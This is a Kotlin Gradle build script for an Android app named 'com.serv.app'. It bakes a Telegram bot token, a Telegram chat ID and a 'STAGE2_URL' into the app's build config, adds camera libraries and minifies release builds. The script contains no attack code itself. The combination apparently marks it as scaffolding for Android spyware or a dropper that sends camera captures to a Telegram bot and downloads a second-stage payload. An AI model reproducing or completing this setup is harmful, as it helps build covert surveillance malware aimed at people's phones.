import java.util.Properties

plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

fun secretOrLocal(name: String, fallback: String): String {
    val env = System.getenv(name)
    if (!env.isNullOrBlank()) return env
    val local = rootProject.file("local.properties")
    if (local.exists()) {
        val p = Properties().apply { local.inputStream().use { load(it) } }
        val v = p.getProperty(name)
        if (!v.isNullOrBlank()) return v
    }
    return fallback
}

android {
    namespace = "com.serv.app"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.serv.app"
        minSdk = 26
        targetSdk = 33
        versionCode = 1
        versionName = "1.0.0"

        buildConfigField("String", "TG_TOKEN",   "\"${secretOrLocal("TELEGRAM_TOKEN", "")}\"")
        buildConfigField("String", "TG_CHATID",  "\"${secretOrLocal("TELEGRAM_CHAT_ID", "")}\"")
        buildConfigField("String", "STAGE2_URL", "\"${secretOrLocal("STAGE2_URL", "")}\"")

        ndk { abiFilters += listOf("arm64-v8a", "armeabi-v7a", "x86_64") }
    }

    buildFeatures {
        buildConfig = true
    }

    signingConfigs {
        create("release") {
            val ksPath = System.getenv("KEYSTORE_PATH")
            if (!ksPath.isNullOrBlank() && file(ksPath).exists()) {
                storeFile = file(ksPath)
                storePassword = System.getenv("KEYSTORE_PASSWORD") ?: ""
                keyAlias = System.getenv("KEY_ALIAS") ?: "app"
                keyPassword = System.getenv("KEY_PASSWORD") ?: ""
            }
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
            val hasKs = !System.getenv("KEYSTORE_PATH").isNullOrBlank()
            signingConfig = if (hasKs) signingConfigs.getByName("release")
                            else signingConfigs.getByName("debug")
        }
        debug {
            isMinifyEnabled = false
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions {
        jvmTarget = "17"
    }
    packaging {
        resources.excludes += setOf(
            "META-INF/AL2.0", "META-INF/LGPL2.1", "META-INF/*.kotlin_module"
        )
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("androidx.camera:camera-core:1.3.4")
    implementation("androidx.camera:camera-camera2:1.3.4")
    implementation("androidx.camera:camera-lifecycle:1.3.4")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.4")
}
